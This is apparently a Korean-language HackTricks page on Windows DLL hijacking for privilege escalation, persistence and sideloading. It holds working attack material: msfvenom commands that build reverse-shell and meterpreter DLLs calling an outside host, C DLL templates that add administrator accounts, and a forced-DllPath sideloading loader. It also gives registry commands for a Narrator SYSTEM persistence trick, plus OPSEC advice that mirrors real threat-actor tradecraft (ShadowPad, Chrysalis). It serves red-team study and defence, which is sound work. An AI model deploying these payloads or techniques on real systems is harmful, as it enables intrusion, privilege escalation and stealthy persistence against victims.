# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## 기본 정보

DLL Hijacking은 신뢰되는 애플리케이션이 악성 DLL을 로드하도록 조작하는 것을 포함합니다. 이 용어는 **DLL Spoofing, Injection, and Side-Loading** 같은 여러 전술을 포괄합니다. 주로 code execution, persistence 달성 및 덜 흔하게는 privilege escalation에 사용됩니다. 여기서는 escalation에 초점을 맞추지만, hijacking 기법은 목표에 관계없이 일관됩니다.

### 일반적인 기법

DLL hijacking에 사용되는 여러 방법들이 있으며, 각 방법의 효과는 애플리케이션의 DLL 로딩 전략에 따라 달라집니다:

1. **DLL Replacement**: 진짜 DLL을 악성 DLL로 교체하는 방법이며, 원본 DLL의 기능을 보존하기 위해 선택적으로 DLL Proxying을 사용할 수 있습니다.
2. **DLL Search Order Hijacking**: 악성 DLL을 합법적인 DLL보다 먼저 검색되는 경로에 배치하여 애플리케이션의 검색 패턴을 악용합니다.
3. **Phantom DLL Hijacking**: 애플리케이션이 필요한데 존재하지 않는 DLL로 오인하도록 악성 DLL을 만들어 로드하게 합니다.
4. **DLL Redirection**: 애플리케이션이 악성 DLL을 가리키도록 `%PATH%`나 `.exe.manifest` / `.exe.local` 같은 검색 매개변수를 수정합니다.
5. **WinSxS DLL Replacement**: WinSxS 디렉터리에서 합법적인 DLL을 악성 DLL로 교체하는 방법으로, 종종 DLL side-loading과 관련됩니다.
6. **Relative Path DLL Hijacking**: 복사된 애플리케이션과 함께 악성 DLL을 사용자가 제어하는 디렉터리에 배치하는 방법으로, Binary Proxy Execution 기법과 유사합니다.

> [!TIP]
> 단계별 체인으로 HTML staging, AES-CTR configs, 및 .NET implants를 DLL sideloading 위에 겹쳐 적용하는 방법은 아래 워크플로를 참고하세요.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## 누락된 Dll 찾기

시스템 내 누락된 Dll을 찾는 가장 일반적인 방법은 sysinternals의 [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)을 실행한 후 **다음 2개의 필터**를 설정하는 것입니다:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

그리고 **File System Activity**만 표시합니다:

![](<../../../images/image (153).png>)

일반적으로 **missing dlls**를 찾고 있다면 이 상태로 몇 **초** 동안 실행해 둡니다.\
특정 실행 파일 내의 **missing dll**을 찾고 있다면 **"Process Name" "contains" `<exec name>`** 같은 추가 필터를 설정한 후 실행하고 이벤트 캡처를 중지하세요.

## 누락된 Dll 악용

권한 상승을 위해 우리가 가진 가장 좋은 기회는 권한이 있는 프로세스가 로드하려 할 때 **write a dll that a privilege process will try to load** 수 있는 것입니다. 따라서 우리는 **dll is going to be searched** 위치들 중에서 **original dll**이 있는 폴더보다 먼저 검색되는 **folder**에 dll을 **write**할 수 있거나(특이한 경우), dll이 검색되는 어떤 폴더에 쓸 수 있고 원본 **dll doesn't exist** 하는 경우가 있을 수 있습니다.

### Dll 검색 순서

**Microsoft documentation**에서 DLL이 어떻게 로드되는지 구체적으로 확인할 수 있습니다.

Windows applications는 특정 순서로 미리 정의된 검색 경로들을 따라 DLL을 찾습니다. DLL hijacking 문제는 악성 DLL이 이러한 디렉터리 중 하나에 전략적으로 배치되어 진짜 DLL보다 먼저 로드될 때 발생합니다. 이를 방지하려면 애플리케이션이 필요한 DLL을 지정할 때 절대 경로를 사용하도록 해야 합니다.

아래는 32-bit 시스템에서의 **DLL 검색 순서**입니다:

1. 애플리케이션이 로드된 디렉터리.
2. 시스템 디렉터리. 이 디렉터리의 경로는 [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) 함수를 사용해 얻습니다.(_C:\Windows\System32_)
3. 16-bit 시스템 디렉터리. 이 디렉터리의 경로를 얻는 함수는 없지만 검색됩니다. (_C:\Windows\System_)
4. Windows 디렉터리. 이 디렉터리의 경로는 [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) 함수를 사용해 얻습니다.
1. (_C:\Windows_)
5. 현재 디렉터리.
6. PATH 환경 변수에 나열된 디렉터리들. 이때 per-application path를 지정하는 **App Paths** 레지스트리 키는 포함되지 않습니다. **App Paths** 키는 DLL 검색 경로를 계산할 때 사용되지 않습니다.

이는 **SafeDllSearchMode**가 활성화된 기본 검색 순서입니다. 비활성화하면 현재 디렉터리가 둘째 위치로 상승합니다. 이 기능을 비활성화하려면 **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** 레지스트리 값을 생성하고 0으로 설정하세요(기본값은 활성화됨).

[**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) 함수가 **LOAD_WITH_ALTERED_SEARCH_PATH** 플래그와 함께 호출되면 검색은 LoadLibraryEx가 로드하는 실행 모듈의 디렉터리에서 시작합니다.

마지막으로, dll이 이름만이 아니라 절대 경로로 지정되어 로드될 수 있다는 점을 유의하세요. 그런 경우 해당 dll은 그 경로에서만 검색됩니다(해당 dll이 종속성을 가질 경우, 그 종속성들은 이름으로 로드된 것처럼 검색됩니다).

검색 순서를 변경하는 다른 방법들도 있지만 여기서는 설명하지 않겠습니다.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

새로 생성된 프로세스의 DLL 검색 경로에 결정적으로 영향을 주는 고급 방법은 ntdll의 네이티브 API로 프로세스를 생성할 때 RTL_USER_PROCESS_PARAMETERS의 DllPath 필드를 설정하는 것입니다. 여기서 공격자가 제어하는 디렉터리를 제공하면, 임포트된 DLL을 이름으로 해석하는(절대 경로가 아니고 safe loading 플래그를 사용하지 않는) 대상 프로세스가 해당 디렉터리에서 악성 DLL을 로드하도록 강제할 수 있습니다.

핵심 아이디어
- RtlCreateProcessParametersEx로 프로세스 파라미터를 구성하고 제어하는 폴더(예: dropper/unpacker가 위치한 디렉터리)를 가리키는 커스텀 DllPath를 제공합니다.
- RtlCreateUserProcess로 프로세스를 생성합니다. 대상 바이너리가 DLL을 이름으로 해석할 때 로더는 이 제공된 DllPath를 참조하여, 악성 DLL이 대상 EXE와 같은 위치에 없더라도 신뢰할 수 있는 sideloading을 가능하게 합니다.

주의사항/제한사항
- 이는 생성되는 자식 프로세스에 영향을 미칩니다; 현재 프로세스에만 영향을 주는 SetDllDirectory와는 다릅니다.
- 대상은 이름으로 DLL을 import하거나 LoadLibrary해야 합니다(절대 경로가 아니며 LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories를 사용하지 않는 경우).
- KnownDLLs와 하드코딩된 절대 경로는 hijack할 수 없습니다. Forwarded exports와 SxS는 우선순위를 변경할 수 있습니다.

간단한 C 예제 (ntdll, wide strings, 단순화된 에러 처리):

<details>
<summary>전체 C 예제: RTL_USER_PROCESS_PARAMETERS.DllPath를 통한 DLL sideloading 강제</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

실전 사용 예
- DllPath 디렉터리에 악성 xmllite.dll(필요한 함수를 export하거나 실제 DLL로 프록시하는)을 배치합니다.
- 위 기법을 사용해 이름으로 xmllite.dll을 조회하는 것으로 알려진 서명된 바이너리를 실행합니다. 로더는 제공된 DllPath를 통해 import를 해결하고 당신의 DLL을 sideloads 합니다.

이 기법은 실전에서 다단계 sideloading 체인을 유발하는 데 관찰되었습니다: 초기 런처가 헬퍼 DLL을 드롭하고, 그 헬퍼가 Microsoft 서명된 hijackable 바이너리를 생성한 뒤 커스텀 DllPath로 스테이징 디렉터리에서 공격자 DLL의 로드를 강제합니다.


#### Exceptions on dll search order from Windows docs

Windows 문서에는 표준 DLL 검색 순서에 대한 몇 가지 예외가 명시되어 있습니다:

- **이미 메모리에 로드된 것과 이름이 같은 DLL**을 만나면, 시스템은 일반적인 검색을 우회합니다. 대신 리디렉션과 매니페스트를 확인한 후 이미 메모리에 있는 DLL을 기본으로 사용합니다. **이 경우 시스템은 DLL을 검색하지 않습니다**.
- 현재 Windows 버전에서 **known DLL**로 인식되는 경우, 시스템은 해당 known DLL과 그에 종속된 DLL들을 사용하여 **검색 과정을 생략합니다**. 레지스트리 키 **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs**에 이러한 known DLL 목록이 저장되어 있습니다.
- **DLL에 종속성이 있는 경우**, 이 종속 DLL들에 대한 검색은 초기 DLL이 전체 경로로 식별되었는지와 관계없이 **모듈 이름만으로 표시된 것처럼** 수행됩니다.

### 권한 상승

**요구사항**:

- **다른 권한**으로 동작하거나 동작할 프로세스(수평 이동 또는 측면 이동)가 있으며, 해당 프로세스가 **DLL이 없는 상태**인 것을 식별합니다.
- **DLL이 검색될** 모든 **디렉터리에 대한 쓰기 권한**이 있는지 확인합니다. 이 위치는 실행 파일의 디렉터리이거나 시스템 경로에 있는 디렉터리일 수 있습니다.

기본적으로 **권한이 있는 실행 파일에서 DLL이 누락된 것을 찾는 것은 꽤 어렵고**, 시스템 경로 폴더에 **쓰기 권한을 가진 것도 더더욱 이상한 경우**입니다(기본적으로 불가능합니다). 하지만 misconfigured 환경에서는 가능할 수 있습니다.\
운이 좋게 요구사항을 만족하는 환경을 찾았다면, [UACME](https://github.com/hfiref0x/UACME) 프로젝트를 확인해보세요. 프로젝트의 **주요 목적이 UAC 우회(bypass UAC)**일지라도, 해당 Windows 버전용 Dll hijacking의 **PoC**를 찾아서(대부분 쓰기 권한이 있는 폴더 경로만 변경하면) 사용할 수 있을 것입니다.

다음과 같이 특정 폴더에서 **권한을 확인할 수 있다는 점을 주의하세요**:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
그리고 **PATH 내부의 모든 폴더 권한을 확인하세요**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
또한 executable의 imports와 dll의 exports를 다음과 같이 확인할 수 있습니다:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
For a full guide on how to **Dll Hijacking을 악용해 권한을 상승시키는 방법** with permissions to write in a **System Path 폴더** check:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### 자동화 도구

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)은 system PATH 내의 어떤 폴더에 쓰기 권한이 있는지 확인합니다.\
이 취약점을 발견하는 데 유용한 다른 자동화 도구로는 **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ 및 _Write-HijackDll._ 가 있습니다.

### 예시

취약한 시나리오를 찾은 경우, 이를 성공적으로 악용하기 위해 가장 중요한 것 중 하나는 **실행 파일이 해당 dll에서 임포트할 모든 함수를 최소한 내보내는 dll을 생성하는 것**입니다. 또한, Dll Hijacking은 [Medium Integrity level에서 High **(bypassing UAC)**로 권한을 상승시키는 경우](../../authentication-credentials-uac-and-efs/index.html#uac)나 [**High Integrity에서 SYSTEM으로**](../index.html#from-high-integrity-to-system) 권한을 상승시키는 데 유용하다는 점을 유의하세요. 해당 실행 목적의 dll hijacking 연구에서 **valid dll을 생성하는 방법**의 예를 다음에서 확인할 수 있습니다: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
또한, **다음 섹션**에서는 **템플릿**으로 활용하거나 **필요하지 않은 함수를 내보낸 dll**을 생성할 때 유용할 수 있는 몇 가지 **기본 dll 코드**를 찾을 수 있습니다.

## **Dll 생성 및 컴파일**

### **Dll 프록시화**

기본적으로 **Dll proxy**는 로드될 때 **악성 코드를 실행**할 수 있으면서도, 실제 라이브러리로의 모든 호출을 전달(relay)하여 **노출되고 기대한 대로 동작**할 수 있는 Dll입니다.

도구 [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) 또는 [**Spartacus**](https://github.com/Accenture/Spartacus)를 사용하면 실제로 **실행 파일을 지정하고 프록시할 라이브러리를 선택**하여 **프록시된 dll을 생성**하거나 **Dll을 지정하여 프록시된 dll을 생성할 수 있습니다**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**meterpreter (x86) 얻기:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**사용자 생성 (x86, x64 버전은 못 봤음):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### 직접 작성

몇몇 경우에 컴파일하는 Dll은 victim process에 의해 로드될 여러 함수를 반드시 **export several functions**해야 한다는 점에 유의하세요. 이러한 함수들이 존재하지 않으면 **binary won't be able to load**하고 **exploit will fail**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL 예제 (사용자 생성 포함)</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>스레드 진입점이 있는 대체 C DLL</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## 사례 연구: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows의 Narrator.exe는 시작 시 예측 가능한 언어별 localization DLL을 검색(probe)하며, 이 DLL을 hijack하여 임의 코드 실행(arbitrary code execution)과 persistence를 얻을 수 있습니다.

Key facts
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- OneCore 경로에 공격자가 제어하는 쓰기 가능한 DLL이 존재하면, 해당 DLL이 로드되고 `DllMain(DLL_PROCESS_ATTACH)`가 실행됩니다. exports는 필요하지 않습니다.

Discovery with Procmon
- 필터: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Narrator를 시작하고 위 경로에 대한 로드 시도를 관찰합니다.

최소한의 DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- 단순한 hijack은 음성 재생 및 UI 하이라이트를 발생시킵니다. 조용히 유지하려면, attach 시 Narrator 스레드를 열거하고, 메인 스레드(`OpenThread(THREAD_SUSPEND_RESUME)`)를 얻어 `SuspendThread`로 정지시킨 후 자체 스레드에서 계속 실행하세요. 전체 코드는 PoC를 참조하세요.

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- 위 설정으로 Narrator를 시작하면 심어놓은 DLL이 로드됩니다. 보안 데스크탑(로그온 화면)에서 CTRL+WIN+ENTER를 눌러 Narrator를 시작하면 DLL이 보안 데스크탑에서 SYSTEM 권한으로 실행됩니다.

RDP-triggered SYSTEM execution (lateral movement)
- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- 호스트에 RDP로 접속한 뒤, 로그온 화면에서 CTRL+WIN+ENTER를 눌러 Narrator를 실행하면 DLL이 보안 데스크탑에서 SYSTEM으로 실행됩니다.
- RDP 세션 종료 시 실행이 중단됩니다—즉시 inject/migrate 하세요.

Bring Your Own Accessibility (BYOA)
- 내장된 Accessibility Tool(AT) 레지스트리 항목(예: CursorIndicator)을 복제한 뒤, 임의의 바이너리/DLL을 가리키도록 편집하고 가져온 다음 `configuration`을 해당 AT 이름으로 설정할 수 있습니다. 이렇게 하면 Accessibility 프레임워크 하에서 임의의 실행을 프록시할 수 있습니다.

Notes
- Writing under `%windir%\System32` and changing HKLM values requires admin rights.
- All payload logic can live in `DLL_PROCESS_ATTACH`; no exports are needed.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

이 사례는 Lenovo의 TrackPoint Quick Menu (`TPQMAssistant.exe`)에서 발생한 Phantom DLL Hijacking을 보여주며, **CVE-2025-1729**로 추적됩니다.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe`는 `C:\ProgramData\Lenovo\TPQM\Assistant\`에 위치합니다.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask`는 매일 오전 9:30에 로그인된 사용자 컨텍스트에서 실행됩니다.
- **Directory Permissions**: `CREATOR OWNER`가 쓰기 권한을 가지며, 로컬 사용자가 임의 파일을 배치할 수 있습니다.
- **DLL Search Behavior**: 작업 디렉터리에서 먼저 `hostfxr.dll`을 로드하려 시도하고 누락되면 "NAME NOT FOUND"를 로그하므로 로컬 디렉터리 검색 우선순위를 나타냅니다.

### Exploit Implementation

공격자는 동일한 디렉터리에 악성 `hostfxr.dll` 스텁을 배치하여 누락된 DLL을 악용해 사용자 컨텍스트에서 코드 실행을 달성할 수 있습니다:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### 공격 흐름

1. 일반 사용자로서 `hostfxr.dll`을 `C:\ProgramData\Lenovo\TPQM\Assistant\`에 배치합니다.
2. 현재 사용자 컨텍스트에서 예약된 작업이 오전 9:30에 실행될 때까지 기다립니다.
3. 작업 실행 시 관리자 계정이 로그인된 상태이면, 악성 DLL이 관리자 세션에서 medium integrity로 실행됩니다.
4. 표준 UAC bypass 기법을 연결하여 medium integrity에서 SYSTEM 권한으로 상승시킵니다.

## 사례 연구: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

위협 행위자들은 종종 MSI 기반 드로퍼를 DLL side-loading과 결합하여 신뢰받는 서명된 프로세스 하에서 페이로드를 실행합니다.

체인 개요
- 사용자가 MSI를 다운로드합니다. GUI 설치 도중 CustomAction이 백그라운드에서 조용히 실행되며(예: LaunchApplication 또는 VBScript action), 내장 리소스에서 다음 단계를 재구성합니다.
- 드로퍼는 정당한 서명된 EXE와 악성 DLL을 동일한 디렉터리에 씁니다 (예: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- 서명된 EXE가 시작되면, Windows의 DLL 검색 순서에 따라 작업 디렉터리에서 먼저 wsc.dll을 로드하여 서명된 상위 프로세스 하에서 공격자 코드를 실행합니다 (ATT&CK T1574.001).

MSI 분석 (확인할 항목)
- CustomAction 테이블:
- 실행 파일이나 VBScript를 실행하는 항목을 찾아보세요. 예시 의심 패턴: LaunchApplication이 백그라운드에서 임베디드 파일을 실행함.
- Orca(Microsoft Orca.exe)에서 CustomAction, InstallExecuteSequence 및 Binary 테이블을 검사하세요.
- MSI CAB에 임베디드/분할된 페이로드:
- 관리자 추출: msiexec /a package.msi /qb TARGETDIR=C:\out
- 또는 lessmsi 사용: lessmsi x package.msi C:\out
- VBScript CustomAction에 의해 연결되고 복호화되는 여러 작은 조각을 찾아보세요. 일반적인 흐름:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
wsc_proxy.exe를 이용한 실전 sideloading
- 다음 두 파일을 같은 폴더에 넣으세요:
- wsc_proxy.exe: 합법적으로 서명된 호스트(Avast). 이 프로세스는 자신의 디렉터리에서 이름으로 wsc.dll을 로드하려고 시도합니다.
- wsc.dll: attacker DLL. 특정 exports가 필요 없다면 DllMain으로 충분합니다; 그렇지 않으면 proxy DLL을 빌드하고 DllMain에서 payload를 실행하는 동안 필요한 exports를 원본 라이브러리로 포워딩하세요.
- 최소한의 DLL payload를 빌드하세요:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- 내보내기 요구사항의 경우, 프록시 프레임워크(예: DLLirant/Spartacus)를 사용하여 페이로드도 실행하는 포워딩 DLL을 생성하라.

- 이 기술은 호스트 바이너리의 DLL 이름 해석에 의존한다. 호스트가 절대 경로를 사용하거나 안전한 로드 플래그(예: LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories)를 사용하면 하이재킹이 실패할 수 있다.
- KnownDLLs, SxS, 및 forwarded exports는 우선순위에 영향을 줄 수 있으므로 호스트 바이너리와 export 집합을 선택할 때 고려해야 한다.

## 서명된 3파일 트라이어드 + 암호화된 페이로드 (ShadowPad 사례 연구)

Check Point는 Ink Dragon이 ShadowPad를 디스크에 핵심 페이로드를 암호화한 채로 정식 소프트웨어처럼 위장하기 위해 **세 파일 트라이어드**를 사용하는 방법을 설명했다:

1. **서명된 호스트 EXE** – AMD, Realtek, 또는 NVIDIA 같은 벤더가 악용된다 (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). 공격자는 실행파일의 이름을 Windows 바이너리처럼 위장(예: `conhost.exe`)하지만 Authenticode 서명은 유효하게 남아 있다.
2. **악성 로더 DLL** – EXE 옆에 예상 이름으로 드롭된다 (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). 이 DLL은 대개 ScatterBrain 프레임워크로 난독화된 MFC 바이너리이며, 유일한 임무는 암호화된 블롭을 찾아 복호화하고 reflectively map ShadowPad이다.
3. **암호화된 페이로드 블롭** – 종종 같은 디렉터리에 `<name>.tmp`로 저장된다. 복호화된 페이로드를 메모리 매핑한 후 로더는 포렌식 증거를 없애기 위해 TMP 파일을 삭제한다.

전술 노트:

* 서명된 EXE의 이름을 바꾸되 PE 헤더의 원래 `OriginalFileName`을 유지하면 Windows 바이너리로 위장하면서 벤더 서명을 유지할 수 있다. 따라서 실제로는 AMD/NVIDIA 유틸리티인 `conhost.exe`처럼 보이는 바이너리를 드롭하는 Ink Dragon의 습관을 재현하라.
* 실행파일이 신뢰된 상태로 유지되므로 대부분의 allowlisting 제어는 악성 DLL이 그 옆에 놓이는 것만으로 충분하다. 로더 DLL 커스터마이징에 집중하라; 서명된 상위 실행파일은 보통 변경하지 않고 실행할 수 있다.
* ShadowPad의 복호화기는 TMP 블롭이 로더 옆에 존재하고 쓰기 가능하기를 기대하며, 매핑 후 파일을 제로화한다. 페이로드가 로드될 때까지 디렉터리를 쓰기 가능 상태로 유지하라; 메모리에 올라간 후에는 TMP 파일을 OPSEC을 위해 안전하게 삭제할 수 있다.

## 사례 연구: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

최근 Lotus Blossom 침해에서는 신뢰된 업데이트 체인을 악용해 NSIS로 패킹된 dropper를 배포했고, 이는 DLL sideload와 완전히 메모리 내 페이로드를 스테이징했다.

트레이드크래프트 흐름
- `update.exe` (NSIS)는 `%AppData%\Bluetooth`를 생성하고 **HIDDEN**으로 표시한 뒤, 이름이 바뀐 Bitdefender Submission Wizard `BluetoothService.exe`, 악성 `log.dll`, 그리고 암호화된 블롭 `BluetoothService`를 드롭하고 EXE를 실행한다.
- 호스트 EXE는 `log.dll`을 임포트하고 `LogInit`/`LogWrite`를 호출한다. `LogInit`은 블롭을 mmap으로 로드한다; `LogWrite`는 맞춤형 LCG 기반 스트림(상수 **0x19660D** / **0x3C6EF35F**, 키 재료는 이전 해시에서 파생)을 사용해 복호화하고 버퍼를 평문 셸코드로 덮어쓴 뒤 임시를 해제하고 그곳으로 점프한다.
- IAT를 회피하기 위해 로더는 export 이름을 해싱(기준 **FNV-1a basis 0x811C9DC5 + prime 0x1000193**)한 다음 Murmur 스타일의 avalanche(**0x85EBCA6B**)를 적용하고 솔트된 대상 해시와 비교해 API를 해결한다.

주요 셸코드 (Chrysalis)
- PE 유사 메인 모듈을 키 `gQ2JR&9;`로 다섯 번의 패스에 걸쳐 add/XOR/sub를 반복해 복호화한 뒤 동적으로 `Kernel32.dll`을 로드하고 `GetProcAddress`로 임포트 해결을 완료한다.
- 런타임에 문자별 bit-rotate/XOR 변환으로 DLL 이름 문자열을 재구성한 다음 `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`를 로드한다.
